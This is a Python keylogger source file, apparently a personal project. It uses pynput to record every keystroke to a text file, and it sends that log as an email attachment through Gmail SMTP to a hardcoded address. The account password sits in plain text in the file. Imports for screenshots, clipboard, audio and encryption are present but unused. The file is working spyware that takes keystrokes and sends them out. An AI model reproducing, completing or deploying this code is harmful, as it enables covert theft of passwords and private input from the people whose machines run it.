# import pywin32 pynput scipy cryptography requests pillow sounddevice

# Libraries

# 1 Email Libraries -

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib


import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener  # keystrokes input library

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd  # audio library

from cryptography.fernet import Fernet  # Encryption Library

import getpass
from requests import get  # get usernames and passwords

from multiprocessing import Process, freeze_support  # for one screenshot at a time
from PIL import ImageGrab  # screenshot library


# Default Variables

keys_information = "key_log.txt"
email_address = "trashkeylogger@gmail.com"  # trash email address
password = "fyylgrzcjqftecbt"
toaddr = "trashkeylogger@gmail.com"
file_path = "C:\\Users\\RAHUL\\Desktop\\KeyLogger\\Project"
extend = "\\"  # it will add a extra slash in the path so that we can access the key_log.txt file

# Email Functionality


def send_email(filename, attachment, toaddr):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body of the Mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename=%s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    text = msg.as_string()
    s.sendmail(email_address, toaddr, text)
    s.quit()


send_email(keys_information, file_path + extend + keys_information, toaddr)

# Key Logger Functionality
count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                f.write('\n')
            elif "Key" not in k:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
